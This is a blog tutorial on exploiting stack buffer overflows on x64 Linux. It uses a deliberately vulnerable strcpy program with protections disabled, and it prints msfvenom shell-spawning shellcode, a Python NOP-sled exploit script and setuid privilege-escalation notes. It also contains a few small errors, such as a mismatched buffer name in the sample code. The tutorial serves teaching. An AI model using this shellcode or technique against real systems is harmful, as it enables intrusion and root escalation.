---
layout:   post
title:   X64 Linux Binary Exploitation Part 1 Stack Based Overflow
description:   Buffer Buffer Overflows
date:   2022-12-11 01:20:00 +0300
image: '/assets/img/posts/stack-based-overflows-on-64bit-linux/banner.png'
tags:   [c,assembly,x86,32-bit,memory-segmentation,memory-segmentation,buffer-overflows]
featured:   false
---

<!-- This paper will require you to having a basic understanding on how assembly and the memory-segmentation -->
<!-- works. You can read how the memory-segmentation is working by visiting this paper. -->

# What is a Buffer Overflow?
Buffer overflow vulnerabilities have been around since the beginning of the computers. 
Most internet viruses and worms take advantage of this concept to propagate, and exploit zero-day vulnerabilities.

C is a high level programming language (despite the fact that nowadays people call it low level.) 
but it assumes that the programmer is responsible for memory and data integrity. If this responsibility ,
were shifted over to the compiler, the resulting binary would be significantly slower, due to integrity checks
on each variable. We can observe the reality of this by experimenting the difference with some modern day 
programming languages. Whether they are interpreted, compiled or both, such as JIT (Just in Time Compiler),
the resulting binaries are much slower when they do have garbage collection, 
dynamic typing and other facilities which make it easier for the programmer to write programs. 
Processing overheads are inevitable in such cases. C does not do any of that, there is no overhead,
but that means programmer needs to be able to allocate memory and free them to prevent memory leaks,
and must deal with static typing of variables. However, lacking those features gives a significant level of control to the programmer.

While C’s simplicity increases the programmer’s level of control and the efficency, 
it also means that those programs are very likely vulnerable to buffer-overflows if the programmer 
is not cautious enough. Once a variable is allocated memory, there is no built-in safeguards 
or any preventation mechanisms to ensure that the contents of that variable fit into the allocated memory. 
If a programmer wants to store a ten character long string in a memory, and allocates only eight bytes,
that type of operation is allowed. However, it will most likely cause program to crash. 
This is known as buffer-overflows since the last two bytes of the string data will not be fit into 
its allocated space and overwrites whatever happens to come next in the relevant segment.

# Overview

<!-- We will use C programming language through the post. Since the C programming language is the closest one -->
<!-- to the machine code after assembly, we will use it in order to analyze how variables, arrays, functions -->
<!-- are taking their place in memory and how the CPU work with those data. -->
<!---->
I want to start by writing the most complex C code that can be written.
![](/assets/img/posts/binary-exploitation/1.png)<br>

Let's compile and run it.
![](/assets/img/posts/binary-exploitation/2.png)<br>

The aim of that paper will gain a perspective on how hackers see the code and exploit them. In order for us to 
see the bigger picture, we have to analyze each step carefully. Therefore, I will start by making that statement:
the **firstprogram.c** is just a text file, and it does not carry and meaning for CPU except it is just being a simple text
file. It is what we call **the source code**. It should be complied (as we did) into an executable binary file, **.exe**
for windows and **ELF executable** for Linux in 2022. We can think of the compiler as a middle ground. 
There are different CPU architectures, the instruction set for ARM will not work with x86, SPARC, x64,etc.
For each architecture, specialized machine code should be written for 
the same piece of program. It is pain. Instead, people write their programs in an universally accepted (high/low-level
programming languages) syntax and the compiler translates 
that piece of source code into the machine code with the available instruction set that the present CPU supplies. 
When the executable has executed, its instructions are getting loaded to the **RAM** for the CPU (or GPU) to handle.<br>

Here things goes tricky. From the programmers' perspective they should only focus on coding a well functioning program.
However, hacker knows that the compiled machine code is what actually getting executed by the CPU in the real world.
By having a deep understanding on how the CPU works, hacker can manipulate the expected behavior in their behalf.<br>


# Processors
Processors have superfast memory units called caches and registers. Most of the instructions are actively
using those registers to read and write the data. Therefore, it is essential to understand how those
registers work in order to have a good understanding on how a CPU works.

* # Registers

A processor register is a quickly accessible location available to a computer's processor. 
Registers usually consist of a small amount of fast storage, although some registers have specific
hardware functions, and may be read-only or write-only. In computer architecture, registers are typically 
addressed by mechanisms other than main memory, but may in some cases be assigned a memory address.
Almost all computers, whether load/store architecture or not, load data from a larger memory into registers where it is used 
for arithmetic operations and is manipulated or tested by machine instructions. Manipulated data is then often stored back to 
main memory, either by the same instruction or by a subsequent one. Modern processors use either static or dynamic RAM as main 
memory, with the latter usually accessed via one or more cache levels.

Processor registers are normally at the top of the memory hierarchy, and provide the fastest way to access data. 
The term normally refers only to the group of registers that are directly encoded as part of an instruction, 
as defined by the instruction set. 

* # Memory Hierarchy

![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/15.png){:.normal}


* # x86 Architecture

The x86 architecture has eight 32-bit general purpose registers (GPRs):
EAX, EBX, ECX, EDX, EDI, EBP and ESP. Some of them further divided into 8 and 16 bit registers. 
EIP is being used to store the instruction pointer.<br>
General purpose registers for x86 as the
following:
![](/assets/img/posts/binary-exploitation/5.png)<br>


| REGISTER               | Purpose                                                | 
|:-----------------------|:-------------------------------------------------------|
|ECX                     | Counter in loops                                      |
|ESI                     | Source in string/memory operations                     |
|EDI                     | Destination in string/memory operations                |
|EDP                     | Base frame pointer                                     |
|ESP                     | Stack pointer                                          |

The common data types are as follows:
- Bytes: 8 bits. Examples: AL, BL, CL
- Word: 16 bits. Examples: AX, BX, CX
- Double Word: 32 bits. Examples: EAX, EBX, ECX
- Quad Word: 64 bits. While x86 does not have 64-bit GPRs, it can combine
two registers, usually EDX:EAX, and treat them as 64-bit values in some 
scenarios. For example, the RDTSC instruction writes a 64-bit value to EDX:EAX.<br>

The 32-bit EFLAGS register is used to store the status of arithmetic operations
and other execution states for x86 as well as information 
about restrictions placed on the CPU operation at the current time.
For instance, if the an ADD
operation resulted in a zero, the ZF flag will be set to 1. The flags in EFLAGS are
primarily used to implement conditional branching.In addition to the GPRs, EIP, 
and EFLAGS, there are also registers that control
important low-level system mechanisms such as virtual memory, interrupts, and
debugging. 

There are also model-specific registers (MSRs). As the name implies, these
registers may vary between different processors by Intel and AMD. Each MSR
is identified by name and a 32-bit number, and read/written to through the
RDMSR/WRMSR instructions.

* ## x64 Architecture

Since there are little to none 32 bit operating systems in real world, we will execute 
our practices on a 64-bit system. So we need to understand x64 architecture.<br>

X64 is an extension of x86, so most of the architecture properties are the same,
with minor differences such as register size and some instructions are unavailable. 
The following sections discuss the relevant differences.
![](/assets/img/posts/binary-exploitation/6.png)<br>
While RBP can still be used as the base frame pointer, it is rarely used for that
purpose in real-life compiler-generated code. Most x64 compilers simply treat
RBP as another GPR, and reference local variables relative to RSP.

* ## Examining the Registers on Runtime

We will use something called GDB (GNU Debugger). Debuggers are tools used by programmers to 
analyze compiled programs, step through them, examine the memory, CPU cache and registers.
A debugger can interfere the execution and change it along the way.
At the following picture, GDB is used to show the state of the processor registers right 
before the program starts.
![](/assets/img/posts/binary-exploitation/7.png)<br>

A breakpoint set on the main() function. Therefore, when we run the program, debugger will
pause the execution when the program counter hits to the starting address of the main() function's 
first instruction. Then we examine the registers with their latest values.<br>

There is one crucially special pointer register called **instruction pointer** which tracks the execution of the program. The
instruction pointer is stored in the **EIP** register, and it holds a 64-bit memory address.<br>

The first four register, as mentioned above, are general purpose registers. And they are known 
as the **Accumulator**, **Counter**, **Data** and **Base** registers respectively.<br>

Following four registers are also GPRs. However, they are sometimes known as indexes and pointers.
These stand for **Stack Pointer**, **Base Pointer**, **Source Index**, **Destination Index** respectively.
**RSP** and **RBP** called pointers because they store 64-bit addresses, which essentially point to that location 
in the memory. These registers are fairly crucial to program execution and memory management. **RSI** and **RDI** 
are known as the **Source and Destination Indexes**, they too are technically pointers. They are commonly used 
to point to the source and destination when data needs to be read from or written to.<br>

The remaining EFLAGS registers in the picture ( [PF ZF IF] ) actually consists of several bit flags that
are used for comparisons and memory segmentations. The actual memory is
split into several different segments, which will be discussed later, and these
registers keep track of that. For the most part, these registers can be ignored
since they rarely need to be accessed directly

<!-- ## Data Movement -->
<!-- x64 supports a concept referred to as RIP-relative addressing, which allows   -->
<!-- instructions to reference data at a relative position to RIP. For example: -->
<!-- {% highlight assembly %} -->
<!-- 01: 0000000000000000 48 8B 05 00 00+ mov rax, qword ptr cs:loc_A -->
<!-- 02: ;                       originally written as "mov rax,[rip]" -->
<!-- 03: 0000000000000007 loc_A: -->
<!-- {% endhighlight %} -->
<!---->
<!-- Line 1 reads the address of loc_A (which is 0x7) and saves it in RAX. RIP- -->
<!-- relative addressing is primarily used to facilitate position-independent code. -->

# Assembly Languagae
Assembly language is the lowest level programming language that is intended to communicate directly with a computer's hardware.
Each CPU comes with different instruction set. Therefore, an assembly 
programmer can not follow the common sense as they do with a compiled language. They have to read the actual CPU manual
book, and follow its own instructions to write their own program accordingly since assembly is converted directly 
to the machine code with no compilation process. When it comes to syntax, there are two common assembly syntaxes:
Intel and AT&T.

* # How Assembly Works?
The assembly instructions in Intel syntax generally follow this style:<br>
{% highlight assembly %}
operation <destination> <source>
{% endhighlight %}

Depending on what operation is being used, those source and destination values will be treated accordingly as the 
operation code demands. The destination and source values will either be a register, a memory address, or a value
The operations are usually intuitive mnemonics.<br>

For example the **MOV** operation will move a value from the source to the destination.
**SUB** will substract the source value from the destination value, **INC** will increment.

![](/assets/img/posts/binary-exploitation/8.png)<br>

The first instruction above will  move the value of the **rsp** to **rbp**. Then
the second instruction will subtract 0x10 from the value written in the **rsp**.<br>

There are also flow control operations in the instruction set for the execution. **CMP** operation
compares two values, any operation starts with a **J** (jump) is being used to set the **EIP** (Instruction Pointer,
we will come to that) into a 
different memory address value.

<!-- ![](/assets/img/posts/binary-exploitation/4.png)<br> -->

We can see how that binary executable look like with a **GNU developement tool** called **objdump**. Let's see what
that the **main()** function had translated to.

<!-- ![](/assets/img/posts/binary-exploitation/3.png)<br> -->
<!---->
<!-- Each byte is represented in hexadecimal notation, which is a base-16 numbering system, since it is more practical -->
<!-- to express an 8-bit value by using two characters instead of eight. The hex numbers at the far left ending with a colon are  -->
<!-- the memory addresses. Those addresses are where the instructions are getting stored as a collection of bytes for  -->
<!-- a temporary amount of time for the CPU to handle.<br> -->
<!---->
<!-- Memory can be thought as a row of bytes. Each row has a defined space (1 byte %99.9 of the time) and each defined  -->
<!-- space starts with an address. Therefore, when we say that we have a 64-bit processor we are saying that our CPU supports -->
<!-- 2^64 (18 billion) possible addresses.<br> -->
<!---->
<!-- The hex values at the middle are the machine language instructions for the processor. For example, let's examine the -->
<!-- first instruction. It is 0x55 (hexadecimal notation starts with a 0x as a rule of thumb) in hexadecimal,  -->
<!-- 85 in decimal when converted, and 1010101 in binary. Since processors can only handle ones and zeroes,  -->
<!-- that hex value being red as its binary value in the CPU. And for the current instruction set that operation code,  -->
<!-- which is 0x55, means : **push %rbp** in assembly language. And the texts at the far right, just like I said, -->
<!-- they are assembly code human-readable representations of the machine instructions.<br> -->
* # AT&T and Intel Syntax Differences

- AT&T prefixes the register with %, and immediates with $. Intel does not
do this.
- AT&T adds a prefix to the instruction to indicate operation width. For
example, MOVL (long), MOVB (byte), etc. Intel does not do this.
- AT&T puts the source operand before the destination. Intel reverses the
order.

Intel
{% highlight assembly %}
  mov ecx, AABBCCDDh
  mov ecx, [eax]
  mov ecx, eax
{% endhighlight %}
AT&T
{% highlight assembly %}
  movl $0xAABBCCDD, %ecx
  movl (%eax), %ecx
  movl %eax, %ecx
{% endhighlight %}


Since Intel representation is much more clean and understandable, I will be using Intel syntax from now on.
It is worth to note that syntax does not mean anything for the CPU, it is there for humans. 


> Before continuing to this paper, [**visit this link.**](https://www.knucklesecurity.com/2022/12/02/memory-segmentation/)
> It is crucial to understand 
> what is memory and how it is segmented in order to be able to understand rest of this paper.

<!-- # Stack Segment -->
<!---->
<!-- The stack segment is used as a temporary pile to store local function variables and context during function calls. -->
<!-- When a program calls for a function, EIP will point to the first instruction written for that function,  -->
<!-- and that function will have its own variables within its function scope, and a new stack frame will be created for that function.  -->
<!-- After a function call EIP does not immediately jumps to the address written on it, first the CPU pushes all the parameters passed -->
<!-- to that function to the stack, then, since the EIP have to go back to the instruction where it was left before the function call, -->
<!-- the return address and the stack base pointer will be passed to the stack. When the last instruction of the called function is read -->
<!-- by the EIP, return address and base pointer address pushed to the stack before the function call will be read and by the instruction -->
<!-- and stack pointer, and execution will continue from where it was left. All of this information is stored together on the stack in what  -->
<!-- is collectively called a stack frame. The stack contains many stack frames. -->
<!---->
<!-- In general computer science terms, a stack is an abstract data structure -->
<!-- that is used frequently. It has first-in, last-out (FILO) ordering, which means the first item that is put into a stack is the last  -->
<!-- item to come out of it. You can’t get the first bead off until you have removed all the other beads. When an item is placed into a stack, -->
<!-- it’s known as pushing, and when an item is removed from a stack, it’s called popping. -->
<!---->
<!-- Stack segment, as the name implies, is a stack data structure, which stores all the stack frames. The ESP (stack pointer) -->
<!-- is used to store the address of the last data pushed onto the stack. That address is constantly changin as the PUSH and POP  -->
<!-- operations are executed by the CPU. As this behavior being dynamic, just like heap, stack segment does not have a fixed size. -->
<!-- Stack segment grows upward in a visual listing of memory, toward lower memory addresses, as opposed to the heap. -->
<!---->
<!-- Several things are pushed into to the stack. The EBP (base pointer, sometimes called frame pointer FP),  -->
<!-- is used to reference local function variables in the current stack frame, it stores the starting address of the active stack frame. -->
<!-- Each stack frame contains parameters to the function, its local variables, and two pointers that are neccesarry to put things back  -->
<!-- the way they were. The saved frame pointer (SFP) and the return address. The SFP is used to restore EBP to its previous value, which  -->
<!-- is the starting address of the previous stack frame. And the return address is used to restore EIP to the next instruction found after  -->
<!-- the function call. This restores the functional context of the previous stack frame. -->
<!---->

# Function Invocation

When a function is called, the compiler uses, a stack frame (allocated within the program’s runtime stack) in order store all 
the temporary information that the function requires such as local variable. Depending on the calling convention the caller function 
will place the aforementioned information in specific registers or in the program stack or in both.
For example for the C calling convention (cdecl) on a 32-bit Linux operating system passes the function arguments
to the stack from in reverse order. For 64-bit binaries SysV is being used.  
SysV calling convention requires up to six arguments to be placed 
to the RDI, RSI, RDX, RCX, R8 and R9 registers and anything additional to be placed in to the stack.
On Windows x64, there is only one calling convention and
the first four parameters are passed through RCX, RDX, R8, and R9; the remaining
are pushed on the stack from right to left.

Let’s see a simple example, in order to understand this. The myfunc bellow takes 8 parameters:

![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/16.png){:.normal}
![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/17.png){:.normal}

As expected, the first six arguments are passed using the registers mentioned above, the last 
two h and g are “spilled” to the stack as well as the address to return after the function call,
the RBP, the local variables and a mysterious red zone, which according to the formal definition 
from the AMD64 ABI, is defined as follows:

{% highlight markdown %}
The 128-byte area beyond the location pointed to by %rsp is considered to be reserved and 
shall not be modified by signal or interrupt handlers. Therefore, functions may use this 
area for temporary data that is not needed across function calls. In particular, leaf 
functions may use this area for their entire stack frame, rather than adjusting the stack 
pointer in the prologue and epilogue. This area is known as the red zone.

{% endhighlight %}

There are many calling conventions (stdcall, fastcall, thiscall), each one of them 
defining a unique way on where the caller should place the parameters that the 
function called function requires, for our purpose though what is most important
is the fact that besides the parameters the stack frame contains the return address 
where the execution control will continue after the called function exits.

It is better to examine how those parameters passed into register with a debugger.

![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/13.png){:.normal}
![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/14.png){:.normal}

The first fours parameters are written to the EDI, ESI, EDX and ECX registers respectively. 
This confirms that our X64 Linux system compiles the source code with the SysV calling convention.

# Canonical Addresses

While 64-bit processors have 64-bit wide registers, systems generally do not implement all 64-bits for addressing.
Thus, most architectures define an unimplemented region of the address space which the processor will consider invalid for use. 
Intel and AMD documentation says that for 64 bit mode only 48 bits are actually available for virtual addresses, and bits from 
48 to 63 must replicate bit 47 (sign-extension). Take a look in the memory mapping bellow to see how this concept applies:

![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/8.png){:.normal}

As you can see all the addresses are starting with **0x0000**. The first two bytes are not being used for addressing.
In the picture there are only seven bytes are shown, don't be confused, debuggers problem.

# Virtual Addressing 

If you debug two programs at the same time and examine the memory addresses, you will see those 
addresses are the same. But, how it would be possible, it should lead them to overwrite each other?
In reality, all the programs are loaded into their own virtual address space with virtual addresses, 
and they are mapped to physical memory addresses by Memory Management Unit (MMU). 
This can give more security, easier to manage programs than shared memory, 
and processes can also use more memory than actually available by technique of paging.
For more info read about Virtual addressing and paging.

![Desktop View](/assets/img/posts/memory-segmentation/20.png){:.normal}


# Stack Based Buffer Overflow

First we need a stack overflow vulnerable C code.

{% highlight c %}

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){
  char buff[256];
  strcpy(myBuffer, argv[1]);
}

{% endhighlight %}

<!-- * # What Is a Buffer Overflow? -->

This program simply creates a 256 byte length buffer and copies the first command line argument in it.
So, why the program is vulnerable? Because it blindly copies the user input into a buffer. 
By blindly I mean that it simply doesn’t perform any size checks, while since we use strcpy function it 
is developer's responsibility to make sure the size of the destination string is large enough to store the copied string.
For languages like, C or C++ which don’t have any built-in mechanism to check the data size which 
is copied from one memory destination to another, there is a possibility that this data will exceed 
the buffer’s capacity and this is the case where serious problems occur. 

Since the initialized and uninitialized local variables are stored in the stack, when the variable to which 
data will be written is smaller than the size of the data, a buffer overflow will occur.

The C programming language has many “dangerous” functions that do not check bounds. These functions must be avoided, 
while in the unlikely event that they can’t, then the programmer must ensure that the bounds will never get exceeded. 
Some of these functions are the following:
strcpy(), strcat(), sprintf(), vsprintf(), gets().
These should be replaced with functions such as strncpy(), strncat(), snprintf(), and fgets() respectively. 
The function strlen should be avoided unless you can ensure that there will be a terminating NIL character 
to find. The scanf family (scanf, fscanf, sscanf, vscanf, vsscanf, and vfscanf) is often dangerous to use 

<!-- # SETUID -->
<!---->
<!-- Setuid bit enables user to execute the binary with the privileges of the user who owns the binary. Therefore,  -->
<!-- if a binary is owned by root and has an setuid bit, the binary will be executed as root irrespective of the  -->
<!-- user. The flags setuid and setgid are needed for tasks that require different privileges than what the user  -->
<!-- is normally granted, such as the ability to alter system files or databases to change their login password. -->
<!-- For example, **passwd** binary is a setuid executable. Sudo, su, chsh, ping, mount are other suid executable  -->
<!-- examples. -->

<!-- ![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/4.png){:.normal} -->
<!---->
<!-- However, if a setuid binary is implemented improperly it can cause problems such as granting root  -->
<!-- privileges to a non-root user, also called privilege escalation. Let's create a suid binary. -->
<!---->
<!-- ![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/5.png){:.normal} -->
<!-- ![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/6.png){:.normal} -->
<!---->
<!-- As you can see first, root owned the file and then put the setuid bit to the binary. -->
<!-- Even we run it as a non-root user, it executed as root user. -->
<!---->
<!-- There is a usefull script you can run in order to find all suid bit binaries owned by root. -->
<!-- {% highlight bash %} -->
<!-- find / -user root -perm -4000 2>/dev/null -->
<!-- {% endhighlight %} -->


<!-- # Debugging the Binary -->
<!---->
<!-- There are many sections inside an executable like headers, .init, .got, .plt, .text, .fini  -->
<!-- and function definitions. You can view and disassemble them with **objdump**. Discussing them isn't  -->
<!-- in the scope of this paper for now. However, we will use GDB (GNU debugger) in order to debug  -->
<!-- ram segmentation and machine instructions. Here I disassembled the main function: -->
<!---->
<!-- ![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/7.png){:.normal} -->
<!---->
<!-- I discussed the memory-segmentation in one of my other papers. Even though it was examined  -->
<!-- on 32-bit system, the ideology is the same, you can reference to it. Other than that, the left  -->
<!-- is simple assembly machine instructions. If you are not familiar with the assembly I would recommend -->
<!-- you to gather basic knowledge on it before continuing to this paper. -->
<!-- # Back to the Vulnerable Program / Stack Smashing -->

<!-- fault. However, we need to be exact and see how many bytes we need to pass at minimum in order to create a buffer-overflow. -->
<!-- We will use GDB with gef extension for that.  -->

<!-- First let's create a pattern. -->
<!-- ![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/10.png){:.normal} -->
<!---->
<!-- Then lets check the RBP to examine the offset. -->
<!-- ![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/11.png){:.normal} -->

* # Overwriting the Return Address<br>

The idea behind for stack based buffer-overflows is to overwrite the saved return address and make the 
program continue from a memory address that we select.
Recall this diagram:

![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/17.png){:.normal}

Stack grows towards the low memory addresses, however if there is a buffer created in that stack frame,
that buffer will grow towards the high memory addresses. For example consider the following:

{% highlight c %}

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void myFunc(char *ptr){
  char myBuffer[5];
  strcpy(myBuffer, ptr);
}

int main(int argc, char **argv){
  myFunc(argv[1]); // argv[1] given as > "Burak"
}

{% endhighlight %}

This particular code will copy the first argument that given to the program to one of its function's local 
buffer. Let's see how it is placed in the stack frame.

![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/18.png){:.normal}

The first breakpoint in the debugger is set right after where the main()'s procedure prologue is complete.
So note the RSP-RBP.<br>

rsp -> 0xfe5b0<br>
rbp -> 0xfe5c0

main()'s stack frame is 16-bytes long.


![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/19.png){:.normal}

The second breakpoint is set before the myFunc() returns.

rsp -> 0xfe580<br>
rbp -> 0xfe5a0

myFunc()'s' stack frame is 32-bytes long.

If we substract the old stack pointer's address from the new base pointer's address:<br>
0xfe5a0-0xfe5b0=-16<br>

And it means that, between two stack frames, there is a 16-bytes long gap. This place is being 
used to store SFP (saved frame pointer-old base pointer) and the return address of the caller function. Therefore,
those addresses neither being stored in the main()'s stack frame nor the function()'s stack frame.<br>

In the following picture, I have dumped all the bytes from the myFunc()'s stack pointer through where the main()'s stack 
frame ends which is going to be 48Bytes.<br>32Bytes(New Stack Frame)+16Bytes(SFP+RET)=48Bytes.

![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/20.png){:.normal}

As you can see myBuffer grows toward the high memory addresses. Therefore, if we go far enough, we can 
overwrite the return address and set the RIP to another location. Remember the native behavior. That 
saved return address is the first machine instruction after the CALL in the main() function. Therefore,
leads program to return to the main() function.

{% highlight shell %}
run Burak$(perl -e 'print "\x90"x16')
{% endhighlight %}
![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/21.png){:.normal}

We have succesfully overwrote the return address.

* # Injecting a Shell Code<br>

What is the point of chaning the address of the instruction pointer? To be able to run our own instructions
of course. Shell code is a set of machine code instructions which spawns a shell for us. Let's create one
with **msfvenom** framework.

{% highlight shell %}
msfvenom -p linux/x64/exec --platform linux -f c -b '\x00\x09\x0a\x20'

[-] No arch selected, selecting arch: x64 from the payload
Found 4 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=9, char=0x00)
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 63 (iteration=0)
x64/xor chosen with final size 63
Payload size: 63 bytes
Final size of c file: 291 bytes
unsigned char buf[] = "\x48\x31\xc9\x48\x81\xe9\xfd\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\x3f\x5d\x0c\x3b\x1c\x04\x8d\x1e\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x77\xe5\x23"
"\x59\x75\x6a\xa2\x6d\x57\x5d\x95\x6b\x48\x5b\xdf\x40\x55"
"\x66\x54\x34\x19\x04\x8d\x1e";

{% endhighlight %}

| Parameter              | Functionality                                              | 
|:-----------------------|:-----------------------------------------------------------|
|-p                      | Stands for payload, we want to spawn a /bin/sh shell.      |
|--platform              | Declaring the platform is linux.                           |
|-f                      | Stands for format. We want our shellcode in the C syntax.   |
|-b                      | Declaring the bad characters.                              |

Parameters above are obvious. However, I want you to notice the **-b** flag. We have excluded some characters 
to be generated in our shellcode.

* ## Bad chars<br>

Bad chars also called invalid characters. When they are received by the program, they 
are being filtered and replaced with other values. Eventually makes our generated 
shell code useless. There is no universal set of bad characters. Depending on the application and the developer logic there 
is a different set of bad characters for every binary that we would encounter.
Therefore, it is a must to find out the bad characters in every executable before generating the shell code.
In our case '\x00\x09\x0a\x20' are the bad chars. You can read how to find bad chars here.


* # Vulnerable Program<br>

Now we have every bit of knowledge what is a buffer-overflow vulnerability and how to exploit it. It is time to practice it.
![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/1.png){:.normal}

Let's compile the code.
![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/2.png){:.normal}

Notice those given parameters to the compiler. Those flags are passed in order to disable some protection 
mechanisms that the compiler applies. Step by step I will disable all those protection mechanisms and teach you 
how to bypass those protections. However, since we are just starting, in order to learn, those mechanisms are better 
shutted off. 

| Parameter              | Functionality                                              | 
|:-----------------------|:-----------------------------------------------------------|
|-g                      | Includes the source code in plain text, easier to debug.   |
|-fno-stack-protector    | Removes the stack Canaries which checks for stack smashing.|
|-z execstack            | Disables the NX bit and makes the stack executable.        |

* # ASLR<br>

<!-- Address Space Layout Randomization (or ASLR) is the randomization of the place in memory where the program,  -->
<!-- shared libraries, the stack, and the heap are. This makes can make it harder for an attacker to exploit a  -->
<!-- service, as knowledge about where the stack, heap, or libc can't be re-used between program launches. -->
<!-- This is a partially effective way of preventing an attacker from jumping to, for example, libc without a leak. -->

Typically, only the stack, heap, and shared libraries are ASLR enabled. It is still somewhat rare for the main program to have ASLR enabled, though it is being seen more frequently and is slowly becoming the default.
ASLR stands for Address Space Layout Randomization. It protects the memory by randomizing the 
address space areas for libraries, stack, heap etc. This protection mechanism makes it harder 
for attacker to predict the correct addresses. There are few techniques to bypass this prevention too,
but just like I said before, for now, we will disable it too.
<!---->
![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/3.png){:.normal}
![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/9.png){:.normal}

Our buffer was 256 bytes long. So, passing 500 characters into the buffer ends up with a segmentation fault.
Now we need to find out what is the offset for the saved return address.

First let's create a pattern.
![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/10.png){:.normal}

Then lets check the RBP to examine the offset.
![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/11.png){:.normal}

Starting from the buffer, if we go 256-bytes, we will hit the first memory address of where the SFP stored.
Therefore, the upcoming eight bytes are dedicated for the SFP. Further six bytes stores the RIP 
(Remember the canonical addresses for X64). Let's also test this.

{% highlight bash %}
r $(perl -e 'print "A"x256')BBBBBBBBZZZZZZ
{% endhighlight %}

ASCII correspondence for **Z** is **5a**, and **42** for **B**. Therefore, we should expect to see the RIP is restored as full of **5a**,
and the RBP set to **42** completely..

![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/22.png){:.normal}

As you can see, debugger can not recognize the function and marked it as **??**, because the return address is not real.
Time to inject our shellcode to the buffer and point the instruction pointer to it.

There is a special instruction called NOP in assembly. And HEX value of the instruction is \x90. If the 
instruction pointer hits to an \x90, it will increment its value by the length of the instruction, and move on.
By filling the buffer with those instructions we are creating something called **NOP slide**. As the name 
suggests, the instruction pointer will slide through until it hits to the shell code. By implementing this method, 
we no longer have to be %100 precise about the memory address of the shell code. As long as we point somewhere
in the NOP slide, the shell code will be executed eventually. And also in execution, those addresses may alter 
in each run. We bypass this behaviour.

This is how the memory should look like as the process proceeds.
![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/23.png){:.normal}

Regardless it is precise or relative, first we have to select an address after we send the payload. In order to select an address in the 
buffer we have to stop the execution before the vulnerable function returns and examine its stack frame. 
![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/24.png){:.normal}

For this demo, let's select the address ends with 0x3f0.

{% highlight python %}

import sys

shellcode = b"\x48\x31\xc9\x48\x81\xe9\xfd\xff\xff\xff\x48\x8d\x05\xef"
shellcode += b"\xff\xff\xff\x48\xbb\x3f\x5d\x0c\x3b\x1c\x04\x8d\x1e\x48"
shellcode += b"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x77\xe5\x23"
shellcode += b"\x59\x75\x6a\xa2\x6d\x57\x5d\x95\x6b\x48\x5b\xdf\x40\x55"
shellcode += b"\x66\x54\x34\x19\x04\x8d\x1e";

buff = b"\x90"*(256-len(shellcode))
rbp = b"\x90"*8

sys.stdout.buffer.write(buff+shellcode+rbp+b"\xf0\xe3\xff\xff\xff\x7f")

{% endhighlight %}

Modern day CPU's are little endian. This is why the address we picked is written in the reverse order byte wise in the function.

{% highlight shell %}
KnuckleSecurity :: -> python stackBased.py > stackBasedPayload.txt
KnuckleSecurity :: -> hexdump stackBasedPayload.txt
0000000 9090 9090 9090 9090 9090 9090 9090 9090
*
00000c0 4890 c931 8148 fde9 ffff 48ff 058d ffef
00000d0 ffff bb48 5d3f 3b0c 041c 1e8d 3148 2758
00000e0 2d48 fff8 ffff f4e2 e577 5923 6a75 6da2
00000f0 5d57 6b95 5b48 40df 6655 3454 0419 1e8d
0000100 9090 9090 9090 9090 e3f0 ffff 7fff
000010e
KnuckleSecurity :: ->

{% endhighlight %}

Let' supply the debugger with the payload and examine the memory.
![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/25.png){:.normal}

Perfect. The memory layout is set just as we wished.<br>

Now it is time to run it without the debugger.

![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/26.png){:.normal}

Worked liked charm :)

You may be wondering what is the point of it? I was using ZSH but now Bash. So what?
And at this point, we need to talk about something called **privilege escalation**.

* # SETUID<br>

Setuid bit enables user to execute the binary with the privileges of the user who owns the binary. Therefore, 
if a binary is owned by root and has an setuid bit, the binary will be executed as root irrespective of the 
user. The flags setuid and setgid are needed for tasks that require different privileges than what the user 
is normally granted, such as the ability to alter system files or databases to change their login password.
For example, **passwd** binary is a setuid executable. Sudo, su, chsh, ping, mount are other suid executable 
examples.

![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/4.png){:.normal}

However, if a setuid binary is implemented improperly it can cause problems such as granting root 
privileges to a non-root user, also called privilege escalation. 
Let's create a SUID binary.

![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/5.png){:.normal}
![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/6.png){:.normal}

As you can see first, root owned the file and then put the setuid bit to the binary.
Even we run it as a non-root user, it executed as root user.

There is a usefull script you can run in order to find all suid bit binaries owned by root.
